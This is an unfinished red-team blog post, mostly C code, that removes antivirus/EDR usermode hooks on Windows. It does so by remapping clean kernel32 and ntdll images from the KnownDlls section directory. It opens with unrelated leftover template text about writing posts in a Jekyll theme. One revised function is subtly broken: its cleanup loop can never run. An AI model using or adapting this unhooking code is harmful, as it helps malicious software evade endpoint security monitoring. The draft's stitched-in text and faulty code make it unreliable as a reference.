---
title: Windows usermode hooks - Part 2 - Removal
#date: 2022-05-xx 14:10:00 +0200
categories: [Redteam, AV/EDR]
tags: [AV/EDR]
render_with_liquid: false
---

This post will guide you how to write a post on _Chirpy_ theme. Even if you have previous experience with Jekyll, this article is worth reading, because many features require specific variables to be set.

```c
#pragma comment(lib, "ntdll")

extern NTSTATUS NTAPI RtlInitUnicodeStringEx(PUNICODE_STRING DestinationString, PWSTR SourceString);
extern NTSTATUS NTAPI NtOpenDirectoryObject(PHANDLE DirectoryHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
extern NTSTATUS NTAPI NtOpenSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
extern NTSTATUS NTAPI NtClose(HANDLE Handle);

BOOL LdrGetKnownDllSectionHandle(LPWSTR DllName, PHANDLE SectionHandle)
{
    BOOL Result = FALSE;

    UNICODE_STRING KnownDllName = { 0 };

#ifdef _WIN64
    RtlInitUnicodeStringEx(&KnownDllName, L"\\KnownDlls");
#else
    RtlInitUnicodeStringEx(&KnownDllName, L"\\KnownDlls32");
#endif
    
    OBJECT_ATTRIBUTES KnownDllAttributes = { 0 };
    InitializeObjectAttributes(&KnownDllAttributes, &KnownDllName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE KnownDllDirectoryHandle = NULL;

    if (NT_SUCCESS(NtOpenDirectoryObject(&KnownDllDirectoryHandle, DIRECTORY_TRAVERSE | DIRECTORY_QUERY, &KnownDllAttributes)) && KnownDllDirectoryHandle != NULL)
    {
        UNICODE_STRING SectionName = { 0 };
        
        if (NT_SUCCESS(RtlInitUnicodeStringEx(&SectionName, DllName)))
        {
            OBJECT_ATTRIBUTES SectionAttributes = { 0 };
            InitializeObjectAttributes(&SectionAttributes, &SectionName, OBJ_CASE_INSENSITIVE, KnownDllDirectoryHandle, NULL);

            if (NT_SUCCESS(NtOpenSection(SectionHandle, SECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_QUERY, &SectionAttributes)))
                Result = TRUE;
        }

        NtClose(KnownDllDirectoryHandle);
    }

    return Result;
}
```

```c
#pragma comment(lib, "ntdll")

typedef enum _SECTION_INHERIT
{
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;

extern NTSTATUS NTAPI LdrGetKnownDllSectionHandle(LPCWSTR DllName, BOOLEAN KnownDlls32, PHANDLE Section);
extern NTSTATUS NTAPI NtMapViewOfSection(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, SECTION_INHERIT InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
extern NTSTATUS NTAPI NtClose(HANDLE Handle);

void LoadKnownDll(LPCWSTR lpModuleName)
{
    HANDLE hSection = NULL;
    LdrGetKnownDllSectionHandle(lpModuleName, FALSE, &hSection);

    PVOID pvBase = 0;
    SIZE_T stSize = 0;
    NtMapViewOfSection(hSection, GetCurrentProcess(), &pvBase, 0, 0, NULL, &stSize, ViewShare, MEM_DIFFERENT_IMAGE_BASE_OK, PAGE_EXECUTE_WRITECOPY);

    NtClose(hSection);
}
```

## Unloading KnownDLLs

```c
#pragma comment(lib, "ntdll")

extern NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress);

void UnloadKnownDll(LPCWSTR lpModuleName)
{
    HMODULE hModule = GetModuleHandleW(lpModuleName);
    NtUnmapViewOfSection(GetCurrentProcess(), hModule);
}
```

## Reloading kernel32.dll

```c
#pragma comment(lib, "ntdll")

typedef enum _SECTION_INHERIT
{
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;

extern NTSTATUS NTAPI LdrGetKnownDllSectionHandle(LPCWSTR DllName, BOOLEAN KnownDlls32, PHANDLE Section);
extern NTSTATUS NTAPI NtMapViewOfSection(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, SECTION_INHERIT InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
extern NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress);
extern NTSTATUS NTAPI NtClose(HANDLE Handle);

void ReloadKnownDll(LPCWSTR lpModuleName)
{
    HANDLE hSection = NULL;
    LdrGetKnownDllSectionHandle(lpModuleName, FALSE, &hSection);

    HMODULE hModule = GetModuleHandleW(lpModuleName);
    NtUnmapViewOfSection(GetCurrentProcess(), hModule);

    PVOID pvBase = 0;
    SIZE_T stSize = 0;
    NtMapViewOfSection(hSection, GetCurrentProcess(), &pvBase, 0, 0, NULL, &stSize, ViewShare, MEM_DIFFERENT_IMAGE_BASE_OK, PAGE_EXECUTE_WRITECOPY);

    NtClose(hSection);
}
```

Yada yada, issue with `GetCurrentProcess` being exported by `kernel32.dll`, so we replace `GetCurrentProcess()` with `(PVOID)-1`.

```c
typedef struct _SECTION_META {
    PVOID pvNext;
    PVOID pvAddress;
    DWORD dwSize;
    DWORD dwCharacteristics;
    PVOID pvData;
} SECTION_META;
```

```c
void ReadSections(SECTION_META** ppHead, HMODULE hModule)
{
    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)hModule;
    IMAGE_NT_HEADERS* inh = (IMAGE_NT_HEADERS*)((PBYTE)hModule + idh->e_lfanew);

    IMAGE_SECTION_HEADER* ish = (IMAGE_SECTION_HEADER*)((PBYTE)inh + sizeof(IMAGE_NT_HEADERS));

    for (WORD i = 0; i < inh->FileHeader.NumberOfSections; i++, ish++)
    {
        if (ish->Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA)
        {
            SECTION_META* section = (SECTION_META*)malloc(sizeof(SECTION_META));

            section->pvNext = (PVOID)*ppHead;
            *ppHead = section;

            section->pvAddress = (PVOID)((PBYTE)hModule + ish->VirtualAddress);
            section->dwSize = ish->Misc.VirtualSize;
            section->dwCharacteristics = ish->Characteristics;
            section->pvData = malloc(section->dwSize);
            memcpy(section->pvData, section->pvAddress, section->dwSize);
        }
    }
}
```

```c
void WriteSections(SECTION_META* pHead)
{
    while (pHead != NULL)
    {
        SECTION_META* section = pHead;
        pHead = (SECTION_META*)pHead->pvNext;

        DWORD dwProtect = 0;

        if ((section->dwCharacteristics & IMAGE_SCN_MEM_WRITE) == 0)
            VirtualProtect(section->pvAddress, section->dwSize, PAGE_READWRITE, &dwProtect);

        memcpy(section->pvAddress, section->pvData, section->dwSize);
        
        if ((section->dwCharacteristics & IMAGE_SCN_MEM_WRITE) == 0)
            VirtualProtect(section->pvAddress, section->dwSize, dwProtect, &dwProtect);

        free(section->pvData);
        free(section);
    }
}
```

```c
#pragma comment(lib, "ntdll")

extern NTSTATUS NTAPI NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewAccessProtection, PULONG OldAccessProtection);

BOOL VirtualProtect_(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)
{
    ULONG NewAccessProtection = (ULONG)flNewProtect;
    ULONG OldAccessProtection = 0;

    NTSTATUS nts = NtProtectVirtualMemory((PVOID)-1, &lpAddress, &dwSize, NewAccessProtection, &OldAccessProtection);

    if (lpflOldProtect != NULL)
        *lpflOldProtect = (DWORD)OldAccessProtection;

    return NT_SUCCESS(nts) ? TRUE : FALSE;
}
```

```c
void memcpy_(PVOID pvDestination, PVOID pvSource, SIZE_T dwSize)
{
    for (SIZE_T i = 0; i < dwSize; i++)
        ((PBYTE)pvDestination)[i] = ((PBYTE)pvSource)[i];
}
```

```c
void WriteSections(SECTION_META* pHead)
{
    while (pHead != NULL)
    {
        SECTION_META* section = pHead;
        pHead = (SECTION_META*)pHead->pvNext;

        DWORD dwProtect = 0;

        if ((section->dwCharacteristics & IMAGE_SCN_MEM_WRITE) == 0)
            VirtualProtect_(section->pvAddress, section->dwSize, PAGE_READWRITE, &dwProtect);

        memcpy_(section->pvAddress, section->pvData, section->dwSize);
        
        if ((section->dwCharacteristics & IMAGE_SCN_MEM_WRITE) == 0)
            VirtualProtect_(section->pvAddress, section->dwSize, dwProtect, &dwProtect);
    }

    while (pHead != NULL)
    {
        SECTION_META* section = pHead;
        pHead = (SECTION_META*)pHead->pvNext;

        free(section->pvData);
        free(section);
    }
}
```

```c
void ReloadKnownDll(LPCWSTR lpModuleName)
{
    HANDLE hSection = NULL;
    LdrGetKnownDllSectionHandle(lpModuleName, FALSE, &hSection);

    HMODULE hModule = GetModuleHandleW(lpModuleName);

    SECTION_META* pHead = NULL;
    ReadSections(&pHead, (PBYTE)hModule);

    NtUnmapViewOfSection(GetCurrentProcess(), (PVOID)hModule);

    PVOID pvBase = 0;
    SIZE_T stSize = 0;
    NtMapViewOfSection(hSection, GetCurrentProcess(), &pvBase, 0, 0, NULL, &stSize, ViewShare, MEM_DIFFERENT_IMAGE_BASE_OK, PAGE_EXECUTE_WRITECOPY);

    NtClose(hSection);

    WriteSections(pHead);
}
```
 
## Reloading ntdll.dll

```c
NTSTATUS NTAPI RtlInitUnicodeStringEx(PUNICODE_STRING DestinationString, PWSTR SourceString)
{
    DestinationString->Length = 0;
    DestinationString->MaximumLength = 0;
    DestinationString->Buffer = SourceString;

    if (SourceString == NULL)
        return 0;

    SIZE_T Length = (SIZE_T)-1;

    do
        Length++;
    while (SourceString[Length] != 0);

    if (Length >= 0x7fff)
        return 0xC0000106;
    
    USHORT ByteLength = (Length & 0xffff) * sizeof(wchar_t);

    DestinationString->Length = ByteLength;
    DestinationString->MaximumLength = ByteLength + sizeof(wchar_t);
    return 0;
}
```

## Handling multi-threaded applications

- Enumerate threads
- Pause all non-current threads
- Apply module reloading
- Resume all non-current threads